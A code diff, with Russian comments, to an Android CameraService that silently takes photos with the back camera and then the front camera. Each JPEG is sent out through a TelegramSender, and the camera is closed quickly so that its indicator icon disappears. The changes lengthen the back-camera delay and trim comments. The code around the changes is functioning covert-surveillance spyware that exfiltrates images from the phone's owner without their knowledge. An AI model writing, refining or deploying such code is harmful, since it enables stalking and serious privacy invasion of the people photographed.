@@ -36,7 +36,7 @@ public class CameraService extends Service {
         
         manager = (CameraManager) getSystemService(CAMERA_SERVICE);
         
-        // Шаг 1. Открываем ЗАДНЮЮ камеру
+        // Начинаем с задней
         capturePhoto("back", "0"); 
         return START_NOT_STICKY;
     }
@@ -82,7 +82,6 @@ public class CameraService extends Service {
                         
                         new TelegramSender().send(out.toByteArray(), tag + ".jpg");
                         
-                        // ЗАКРЫВАЕМ КАМЕРУ, чтобы погас значок
                         img.close(); r.close(); device.close();
                         
                         // Если сняли заднюю, ждем 1.5 сек и запускаем фронталку
@@ -91,7 +90,7 @@ public class CameraService extends Service {
                                 capturePhoto("face", "1");
                             }, 1500);
                         } else {
-                            stopSelf(); // Сделали фронт - завершились
+                            stopSelf();
                         }
                     }, null);
                     try {
@@ -103,11 +102,13 @@ public class CameraService extends Service {
 
                         device.createCaptureSession(java.util.Collections.singletonList(reader.getSurface()), new CameraCaptureSession.StateCallback() {
                             @Override public void onConfigured(CameraCaptureSession s) {
-                                // Ждем 1.5 секунды на настройку экспозиции
+                                // ЖДЕМ 3 СЕКУНДЫ ДЛЯ ЗАДНЕЙ, ЧТОБЫ ОНА 100% ПРОСНУЛАСЬ
+                                long delay = tag.equals("back") ? 3000 : 1500;
+                                
                                 new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                                     try { s.capture(builder.build(), null, null); } 
                                     catch (Exception e) { e.printStackTrace(); }
-                                }, 1500);
+                                }, delay);
                             }
                             @Override public void onConfigureFailed(CameraCaptureSession s) {}
                         }, null);
